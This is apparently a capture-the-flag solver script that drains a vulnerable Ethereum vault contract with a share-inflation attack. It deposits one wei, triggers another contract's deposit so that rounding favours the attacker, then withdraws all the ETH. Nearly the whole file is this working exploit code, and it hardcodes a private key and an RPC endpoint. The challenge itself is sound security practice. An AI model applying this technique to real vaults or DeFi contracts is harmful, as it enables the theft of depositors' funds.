from web3 import Web3
from solcx import install_solc
from setup import SetupContract
from challenge import ChallengeContract
from sb import SharesBuyer
from eth_account import Account

# Install the required Solidity version
# install_solc("0.8.0")
install_solc("0.8.18")

# Configuration
UUID = "5583e8e9-b675-42e2-8c16-7a8294867afe"
RPCEndpoint = f"http://78.47.52.31:14352/5583e8e9-b675-42e2-8c16-7a8294867afe"
PrivateKey = "0x40bc9823048f983806dd1b7d807e7d462d996ef2b5d9a5bc60844bf8992a1592"
SetupAddress = "0xd002ef4f0789F3594b68C3B7F92f5aC528aE884f"

# Set up Web3 instance
web3 = Web3(Web3.HTTPProvider(RPCEndpoint))

# Recover the public key from the private key
account = Account.from_key(PrivateKey)
WalletAddress = account.address

# Print wallet information
print(f"Wallet Address: {WalletAddress}")
print(f"Private Key: {PrivateKey}")

# Instantiate the contract interfaces
Setup = SetupContract(WalletAddress, PrivateKey, RPCEndpoint).attach(SetupAddress)
Challenge = ChallengeContract(WalletAddress, PrivateKey, RPCEndpoint)
SB = SharesBuyer(WalletAddress, PrivateKey, RPCEndpoint)

Setup.attach(SetupAddress)
challenge_address = Setup.Setup.functions.TARGET().call()
sb_address = Setup.Setup.functions.SB().call()

# Main logic to solve the challenge
def solve_challenge():
    # Step 2: Fetch addresses of the ChallengeContract and SharesBuyer
    challenge_address = Setup.Setup.functions.TARGET().call()
    sb_address = Setup.Setup.functions.SB().call()
    print(f"Challenge Contract Address: {challenge_address}")
    print(f"SharesBuyer Contract Address: {sb_address}")

    # Step 3: Attach to the deployed ChallengeContract and SharesBuyer
    Challenge.attach(challenge_address)
    SB.attach(sb_address)

    # Step 4: Deposit a small amount to manipulate share allocation
    print("Depositing a small amount to gain outsized shares...")
    Challenge.deposit_eth(web3.to_wei(0.000000000000000001, "ether"))


    # Step 5: Trigger SharesBuyer to deposit its balance
    print("Triggering SharesBuyer to deposit its balance...")
    SB.buy_shares()


    # Step 4: Deposit a small amount to manipulate share allocation
    print("Depositing a small amount to gain outsized shares...")
    Challenge.deposit_eth(web3.to_wei(99.9, "ether"))

    # Step 6: Withdraw all ETH using acquired shares
    shares = Challenge.get_balance(WalletAddress)
    print(f"Withdrawing ETH with {shares} shares...")
    Challenge.withdraw_eth(shares)

    # Step 7: Check if the challenge is solved
    solved = Setup.is_solved()
    print(f"Challenge Solved: {solved}")


   


if __name__ == "__main__":
    print()
    print()
    balance_wei = web3.eth.get_balance(WalletAddress)
    balance_ether = web3.from_wei(balance_wei, 'ether')
    print(f"Current Balance of ME: {balance_ether} ETH")
    balance_wei = web3.eth.get_balance(challenge_address)
    balance_ether = web3.from_wei(balance_wei, 'ether')
    print(f"Current Balance of Challenge: {balance_ether} ETH")
    balance_wei = web3.eth.get_balance(sb_address)
    balance_ether = web3.from_wei(balance_wei, 'ether')
    print(f"Current Balance of SB: {balance_ether} ETH")


    print("Starting the challenge solver...")
    solve_challenge()